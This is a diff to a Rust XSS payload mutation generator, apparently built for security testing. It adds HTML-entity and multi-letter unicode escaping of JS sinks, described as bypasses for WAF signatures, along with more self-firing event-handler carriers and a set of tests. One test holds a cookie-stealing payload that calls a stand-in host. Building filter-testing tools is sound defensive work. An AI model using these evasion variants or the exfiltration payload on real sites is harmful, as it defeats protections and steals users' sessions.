@@ -10,7 +10,11 @@
 //! degraded to a canned `alert(1)`.
 
 use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
+use crate::grammar::unicode_norm::reachable_keywords;
 use crate::grammar::xss::is_structured_xss;
+
+/// XSS execution function names checked by `still_executes_xss` for PoC attacks.
+const XSS_EXEC_KEYWORDS: &[&str] = &["alert", "confirm", "prompt", "eval", "print"];
 
 /// HTML "before/after attribute name" separators — all parsed
 /// identically by the HTML tokenizer. `/` is a legal attribute
@@ -124,34 +128,55 @@ fn markers(payload: &str) -> Vec<String> {
     m
 }
 
+/// True iff `lc` (already lowercased) carries an `on<handler>=` event
+/// attribute (`onload=`, `onerror=`, …) at a token boundary. Shared by
+/// `has_exec_context` and the entity-context guard (§7 DEDUP).
+fn has_on_handler(lc: &str) -> bool {
+    if !lc.contains('<') {
+        return false;
+    }
+    let bs = lc.as_bytes();
+    let mut k = 0;
+    while k + 3 < bs.len() {
+        if bs[k] == b'o'
+            && bs[k + 1] == b'n'
+            && bs[k + 2].is_ascii_alphabetic()
+            && (k == 0 || !bs[k - 1].is_ascii_alphabetic())
+        {
+            let mut e = k + 2;
+            while e < bs.len() && bs[e].is_ascii_alphabetic() {
+                e += 1;
+            }
+            if e < bs.len() && (bs[e] == b'=' || bs[e].is_ascii_whitespace()) {
+                return true;
+            }
+        }
+        k += 1;
+    }
+    false
+}
+
 fn has_exec_context(lc: &str) -> bool {
     lc.contains("javascript:")
         || lc.contains("<script")
         || lc.contains("srcdoc")
-        || (lc.contains('<') && {
-            // a tag carrying an on<handler>= attribute
-            let bs = lc.as_bytes();
-            let mut k = 0;
-            let mut found = false;
-            while k + 3 < bs.len() {
-                if bs[k] == b'o'
-                    && bs[k + 1] == b'n'
-                    && bs[k + 2].is_ascii_alphabetic()
-                    && (k == 0 || !bs[k - 1].is_ascii_alphabetic())
-                {
-                    let mut e = k + 2;
-                    while e < bs.len() && bs[e].is_ascii_alphabetic() {
-                        e += 1;
-                    }
-                    if e < bs.len() && (bs[e] == b'=' || bs[e].is_ascii_whitespace()) {
-                        found = true;
-                        break;
-                    }
-                }
-                k += 1;
-            }
-            found
-        })
+        || has_on_handler(lc)
+}
+
+/// True iff a JS sink in this payload sits where the HTML parser DECODES
+/// `&#…;` entities before the JS engine runs — i.e. an event-handler
+/// ATTRIBUTE value. Inside a `<script>` raw-text element entities are NOT
+/// decoded (`&#x61;lert` is a JS syntax error, never `alert`), and
+/// `normalize`/`still_executes_xss` decode entities BLINDLY and cannot
+/// tell the two apart — so THIS generator-side guard is the sole
+/// soundness mechanism for HTML-entity rewrites. Deliberately
+/// conservative: requires an `on*=` handler and NO `<script` anywhere, so
+/// a script-body sink is never entity-encoded. (A `javascript:`/`srcdoc`
+/// value would also be safe, but is left out rather than risk an
+/// edge-case misjudgement — soundness over reach.)
+fn entity_attr_context(s: &str) -> bool {
+    let lc = s.to_ascii_lowercase();
+    !lc.contains("<script") && has_on_handler(&lc)
 }
 
 /// True iff `cand` provably still executes the original script.
@@ -169,14 +194,33 @@ pub fn still_executes_xss(original: &str, cand: &str) -> bool {
         if want.is_empty() {
             return true;
         }
-        want.iter().all(|t| lc.contains(t.as_str()))
+        // Every class-defining marker of the original must remain as a WHOLE
+        // token, not buried in a longer alphanumeric run. The prior
+        // `lc.contains(t)` substring check let a marker survive inside a
+        // different identifier/host: `fetch(` "preserved" by `prefetch(`,
+        // exfil host `evil.com` by `notevil.com` / `evil.community` — none of
+        // which is the original attack. `contains_token` (the shared
+        // boundary-aware matcher, §7 DEDUP: one primitive for SQL + XSS) is
+        // edge-aware: markers ending in `(` keep matching `fetch(x)`, and a
+        // subdomain `www.evil.com` still matches `evil.com` (left `.` is a
+        // boundary) while a different host is rejected.
+        want.iter().all(|t| super::contains_token(&lc, t))
     } else {
         // PoC: a demonstrator sink must remain in the exec context.
-        lc.contains("alert")
+        // Primary check on the normalize()-folded form (handles &#NNN; and \uXXXX).
+        let primary = lc.contains("alert")
             || lc.contains("confirm")
             || lc.contains("prompt")
             || lc.contains("eval(")
-            || lc.contains("print(")
+            || lc.contains("print(");
+        if primary {
+            return true;
+        }
+        // Secondary check via NFKC-fold for fullwidth/math-bold Unicode variants
+        // (e.g. `ａlert` normalises to `alert` under NFKC but not under the
+        // custom `normalize()` above). Uses `reachable_keywords` which applies
+        // `nfkc_fold_ascii` before checking.
+        !reachable_keywords(cand, XSS_EXEC_KEYWORDS).is_empty()
     }
 }
 
@@ -360,11 +404,22 @@ fn rw_handler_synonym(payload: &str, rng: &mut Rng) -> Option<String> {
         return None;
     };
     let qb = format!("{q}{body}{q}");
+    // Every entry must AUTO-fire with EXACTLY the attributes written here —
+    // `still_executes_xss` only checks token presence, not real execution, so
+    // this list is the sole soundness authority for "this carrier runs on its
+    // own." Each below is a load/error/focus handler that fires with no user
+    // interaction: `src=x` guarantees the resource fails → `onerror`;
+    // `autofocus` drives `onfocus`; `<iframe>`/`<body>`/`<svg>` `onload` fire
+    // on (about:blank) load; `<audio src=x onerror>` is the same failed-load
+    // path as `<img>`/`<video>`. NO click/hover/animate-timing carriers — those
+    // need attributes or interaction the token oracle cannot verify.
     let mut pool: Vec<String> = [
         "<svg onload={V}>",
         "<svg/onload={V}>",
         "<img src=x onerror={V}>",
+        "<audio src=x onerror={V}>",
         "<body onload={V}>",
+        "<iframe onload={V}>",
         "<details open ontoggle={V}>",
         "<marquee onstart={V}>",
         "<video><source onerror={V}>",
@@ -404,13 +459,81 @@ fn rw_js_unicode(s: &str, rng: &mut Rng) -> Option<String> {
             if !rng.chance(1, 2) {
                 continue;
             }
-            let first = name.as_bytes()[0];
-            let esc = format!("\\u{:04x}", u32::from(first));
-            let mut out = String::with_capacity(s.len() + 5);
-            out.push_str(&s[..pos]);
-            out.push_str(&esc);
-            out.push_str(&s[pos + 1..]);
-            return Some(out);
+            return Some(escape_sink_letters(s, pos, name, rng, |ch| {
+                format!("\\u{:04x}", u32::from(ch))
+            }));
+        }
+    }
+    None
+}
+
+/// Rewrite a RANDOM NON-EMPTY SUBSET of the sink `name`'s letters at byte
+/// `pos` via `enc` (letter → encoded spelling). Shared by the JS-unicode
+/// and HTML-entity rewrites (§7 DEDUP). Every encoder must be reversed by
+/// `normalize`, so `contains_token` still matches the decoded sink, and
+/// only LETTERS are encoded (never the `(`), keeping the call structure
+/// intact. Multi-char (vs a single-first-char escape) breaks WAF
+/// signatures keyed on the sink's SUBSTRINGS (`lert`, `etch`, `ompt`).
+fn escape_sink_letters(
+    s: &str,
+    pos: usize,
+    name: &str,
+    rng: &mut Rng,
+    enc: impl Fn(u8) -> String,
+) -> String {
+    let bytes = name.as_bytes();
+    let mut esc = String::with_capacity(name.len() * 6);
+    let mut any = false;
+    for &ch in bytes {
+        if rng.chance(3, 5) {
+            esc.push_str(&enc(ch));
+            any = true;
+        } else {
+            esc.push(ch as char);
+        }
+    }
+    if !any {
+        // Guarantee the rewrite changes the input (else no value).
+        esc = format!("{}{}", enc(bytes[0]), &name[1..]);
+    }
+    format!("{}{}{}", &s[..pos], esc, &s[pos + name.len()..])
+}
+
+/// HTML-entity-encode a random subset of a JS sink's letters
+/// (`alert` → `&#x61;lert` or `&#97;lert`) — the classic attribute-context
+/// evasion. Fires ONLY in an event-handler attribute value
+/// ([`entity_attr_context`]), where the HTML parser decodes the entities
+/// before the JS engine sees the handler; a WAF keyed on the literal sink
+/// is bypassed while the browser still executes `alert(…)`.
+///
+/// Emits BOTH numeric-entity bases — hex (`&#xNN;`) and decimal (`&#NN;`) —
+/// chosen per call. `normalize` decodes both (it branches on the `x`/`X`
+/// prefix, lines ~41/50), so `still_executes_xss` confirms equivalence
+/// either way. Decimal is a distinct sound bypass: many WAF signatures key
+/// specifically on the `&#x` hex form and miss `&#NN;`.
+fn rw_html_entity(s: &str, rng: &mut Rng) -> Option<String> {
+    if !entity_attr_context(s) {
+        return None;
+    }
+    for name in ["alert", "confirm", "prompt", "eval", "fetch", "print"] {
+        if let Some(pos) = s.find(name) {
+            let after = &s[pos + name.len()..];
+            if !after.trim_start().starts_with('(') {
+                continue;
+            }
+            if !rng.chance(1, 2) {
+                continue;
+            }
+            // Pick the numeric base ONCE for this rewrite so the encoded
+            // run is internally consistent; both decode under `normalize`.
+            let decimal = rng.chance(1, 2);
+            return Some(escape_sink_letters(s, pos, name, rng, move |ch| {
+                if decimal {
+                    format!("&#{ch};")
+                } else {
+                    format!("&#x{ch:x};")
+                }
+            }));
         }
     }
     None
@@ -429,7 +552,7 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
         _ => (all, false),
     };
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
-    let mut out: Vec<EquivPayload> = Vec::new();
+    let mut out: Vec<EquivPayload> = Vec::with_capacity(cfg.max);
 
     if !still_executes_xss(payload, payload) {
         return out;
@@ -458,10 +581,10 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
 
     // Seed 2: sampled browser-equivalent rewrites × delivery.
     let mut attempts = 0;
-    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
+    while out.len() < cfg.max && attempts < cfg.max * super::ATTEMPT_BUDGET_MULTIPLIER + super::ATTEMPT_BUDGET_FLOOR {
         attempts += 1;
         let mut s = payload.to_string();
-        let mut rules: Vec<&'static str> = Vec::new();
+        let mut rules: Vec<&'static str> = Vec::with_capacity(8);
 
         if rng.chance(3, 5)
             && let Some(h) = rw_handler_synonym(&s, &mut rng)
@@ -488,6 +611,14 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
         {
             s = u;
             rules.push("js_unicode_escape");
+        }
+        // HTML-entity sink encoding — attribute-context only (sound guard
+        // inside). No-ops if js_unicode already consumed the literal sink.
+        if rng.chance(2, 5)
+            && let Some(e) = rw_html_entity(&s, &mut rng)
+        {
+            s = e;
+            rules.push("html_entity_escape");
         }
         if rules.is_empty() {
             continue;
@@ -532,14 +663,7 @@ mod tests {
     use super::*;
 
     fn cfg(seed: u64) -> EquivConfig {
-        EquivConfig {
-            seed,
-            max: 48,
-            verify: true,
-            vary_delivery: true,
-            param: "q".into(),
-            force_delivery: None,
-        }
+        crate::grammar::equiv::test_cfg(seed, 48, "q")
     }
 
     #[test]
@@ -560,6 +684,34 @@ mod tests {
                 m.payload
             );
         }
+    }
+
+    #[test]
+    fn structured_marker_buried_in_larger_identifier_is_rejected() {
+        // SOUNDNESS regression (R2 §14 introspection: the same substring-
+        // containment bug found+fixed in the SQL relation also lived here).
+        // The structured-marker gate used `lc.contains(t)` — raw substring —
+        // so a candidate that buries each marker inside a LARGER token passed
+        // even though the buried text is no longer the attack. Here the exfil
+        // markers are `fetch(`, `document.cookie`, and host `evil.tld`.
+        let atk = "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>";
+        // Candidate keeps a valid exec context (real onerror handler) but
+        // every marker is buried: `prefetch(` ⊃ `fetch(`, host `notevil.tld`
+        // ⊃ `evil.tld`. `document.cookie` is kept intact so the test isolates
+        // the burial of the OTHER two — a single buried marker must already
+        // fail the `all(...)`.
+        let buried = "<img src=x onerror=prefetch('//notevil.tld/c?'+document.cookie)>";
+        assert!(
+            !still_executes_xss(atk, buried),
+            "buried markers (prefetch/notevil.tld) must NOT count as the original attack"
+        );
+        // Sanity twin: a subdomain of the SAME exfil host is still the same
+        // target and must still execute (boundary-aware match, not blunt split).
+        let subdomain = "<img src=x onerror=fetch('//x.evil.tld/c?'+document.cookie)>";
+        assert!(
+            still_executes_xss(atk, subdomain),
+            "a subdomain of the exfil host is the same target and must still execute"
+        );
     }
 
     #[test]
@@ -589,8 +741,138 @@ mod tests {
     }
 
     #[test]
+    fn multi_char_unicode_escape_is_equivalent_and_emitted() {
+        // EVERY letter of the sink escaped must still execute — normalize has
+        // to decode the consecutive `\uXXXX` runs back to `alert`.
+        assert!(normalize("\\u0061\\u006c\\u0065\\u0072\\u0074(1)").contains("alert(1)"));
+        assert!(still_executes_xss(
+            "<svg onload=alert(1)>",
+            "<svg onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>"
+        ));
+        // Capability proof: the generator now emits a sound variant carrying
+        // MORE than one `\u` escape (the old code only ever escaped the first
+        // sink letter, leaving `lert` in cleartext for a substring rule).
+        let atk = "<svg onload=alert(1)>";
+        let mut multi = false;
+        for seed in 0..50u64 {
+            for m in generate(atk, &cfg(seed)) {
+                assert!(still_executes_xss(atk, &m.payload), "UNSOUND {:?}", m.payload);
+                if m.payload.matches("\\u").count() >= 2 {
+                    multi = true;
+                }
+            }
+            if multi {
+                break;
+            }
+        }
+        assert!(multi, "generator never emitted a multi-char unicode escape");
+    }
+
+    #[test]
+    fn html_entity_only_fires_in_attribute_context_never_script_body() {
+        // SOUNDNESS (the screwdriver discipline): entities decode in an
+        // attribute value but NOT inside a `<script>` body, where
+        // `&#x61;lert` is a JS syntax error, never `alert`. normalize()
+        // decodes entities blindly, so `still_executes_xss` would WRONGLY
+        // accept a script-body entity form — the generator's
+        // `entity_attr_context` guard is the only thing keeping it sound.
+        // Demonstrate the blind spot, then prove the guard closes it.
+        assert!(
+            still_executes_xss("<script>alert(1)</script>", "<script>&#x61;lert(1)</script>"),
+            "oracle is entity-blind (this is WHY the generator guard must exist)"
+        );
+        let script_body = "<script>alert(1)</script>";
+        for seed in 0..64u64 {
+            let mut rng = Rng::new(seed);
+            assert!(
+                rw_html_entity(script_body, &mut rng).is_none(),
+                "entity-encoded a <script>-body sink (seed {seed}) — would not execute"
+            );
+        }
+        // In an event-handler attribute it fires and stays equivalent.
+        let mut fired = false;
+        for seed in 0..64u64 {
+            let mut rng = Rng::new(seed);
+            if let Some(out) = rw_html_entity("<svg onload=alert(1)>", &mut rng) {
+                fired = true;
+                // `&#` covers both numeric bases: hex `&#xNN;` and decimal `&#NN;`.
+                assert!(out.contains("&#"), "no entity emitted: {out}");
+                assert!(
+                    still_executes_xss("<svg onload=alert(1)>", &out),
+                    "unsound entity form: {out}"
+                );
+            }
+        }
+        assert!(fired, "rw_html_entity never fired in a handler context");
+    }
+
+    #[test]
+    fn generator_emits_html_entity_variant_for_handler_payload() {
+        let atk = "<svg onload=alert(1)>";
+        let mut tagged = false;
+        for seed in 0..60u64 {
+            for m in generate(atk, &cfg(seed)) {
+                assert!(still_executes_xss(atk, &m.payload), "UNSOUND {:?}", m.payload);
+                if m.rules.contains(&"html_entity_escape") {
+                    tagged = true;
+                    // Either numeric base (hex `&#xNN;` or decimal `&#NN;`).
+                    assert!(m.payload.contains("&#"), "tag without entity: {:?}", m.payload);
+                }
+            }
+            if tagged {
+                break;
+            }
+        }
+        assert!(tagged, "generator never emitted an html_entity_escape variant");
+    }
+
+    #[test]
     fn entity_encoded_handler_normalizes() {
         assert!(normalize("&#x61;&#x6c;ert").contains("alert"));
+    }
+
+    #[test]
+    fn decimal_entity_encoded_handler_normalizes() {
+        // The decimal numeric-entity base (`&#NN;`, no `x`) must fold to the
+        // same sink as the hex base. `a`=97, `l`=108 → `alert`.
+        assert!(normalize("&#97;&#108;ert").contains("alert"));
+        assert!(still_executes_xss(
+            "<svg onload=alert(1)>",
+            "<svg onload=&#97;lert(1)>"
+        ));
+    }
+
+    #[test]
+    fn generator_emits_decimal_entity_variant() {
+        // Oracle-asymmetry close: `normalize` decodes BOTH numeric bases but
+        // the generator previously emitted only hex `&#x…;`. Prove a sound
+        // DECIMAL form (`&#NN;`, the byte after `&#` is a digit, never `x`)
+        // now appears — a distinct bypass for WAFs keyed on the `&#x` form.
+        let atk = "<svg onload=alert(1)>";
+        let mut saw_decimal = false;
+        for seed in 0..120u64 {
+            for m in generate(atk, &cfg(seed)) {
+                assert!(still_executes_xss(atk, &m.payload), "UNSOUND {:?}", m.payload);
+                if !m.rules.contains(&"html_entity_escape") {
+                    continue;
+                }
+                // A decimal entity is `&#` immediately followed by an ASCII
+                // digit; the hex form is `&#x…`. Scan for the digit case.
+                let bytes = m.payload.as_bytes();
+                for w in bytes.windows(3) {
+                    if w[0] == b'&' && w[1] == b'#' && w[2].is_ascii_digit() {
+                        saw_decimal = true;
+                    }
+                }
+            }
+            if saw_decimal {
+                break;
+            }
+        }
+        assert!(
+            saw_decimal,
+            "generator never emitted a decimal &#NN; entity variant"
+        );
     }
 
     #[test]
